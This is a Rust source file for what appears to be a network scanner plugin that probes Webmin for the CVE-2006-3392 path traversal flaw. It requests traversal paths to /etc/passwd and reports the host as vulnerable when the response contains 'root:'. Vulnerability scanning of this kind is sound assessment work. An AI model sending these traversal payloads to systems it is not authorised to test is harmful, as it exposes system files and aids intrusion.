/* http-vuln-cve2006-3392-2 - Webmin path traversal probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = [
        "/..%01/..%01/..%01/etc/passwd",
        "/..%01/etc/passwd",
        "/etc/passwd",
    ];
    let mut out = String::new();
    let mut found = 0usize;

    if !valid(ctx) {
        return 1;
    }
    for path in paths.iter() {
        let resp = match http_request(ctx, "GET", path, None, "", "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        let code = http_status(&resp);
        if contains_ci(http_body(&resp), "root:") {
            if found == 0 {
                out.push_str("VULNERABLE: ");
            } else {
                out.push_str(", ");
            }
            out.push_str(&format!("{}", path));
            found += 1;
        }
    }
    if found == 0 {
        set_out(ctx, "not vulnerable: CVE-2006-3392 Webmin traversal");
    } else {
        out.push_str(" (CVE-2006-3392 Webmin traversal)");
        set_out(ctx, &out);
    }
    0
}
